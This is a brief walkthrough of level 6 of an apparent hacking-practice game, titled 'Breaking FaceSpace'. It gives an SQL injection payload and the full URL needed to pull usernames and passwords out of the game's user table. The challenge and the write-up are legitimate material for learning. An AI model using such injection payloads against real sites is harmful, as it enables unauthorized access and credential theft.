#### Level 06 - Breaking FaceSpace

Time to inject some SQL.

This SQL should get the password instead of the status:
```sql
SELECT rank,username,password as status FROM user--
```

Here is the complete url:

http://www.hacmegame.org/hacmegame/challenges/ChallengeS23.html?offset=50;select%20rank,username,password%20as%20status%20FROM%20user--

Pick a random username and its password. Complete.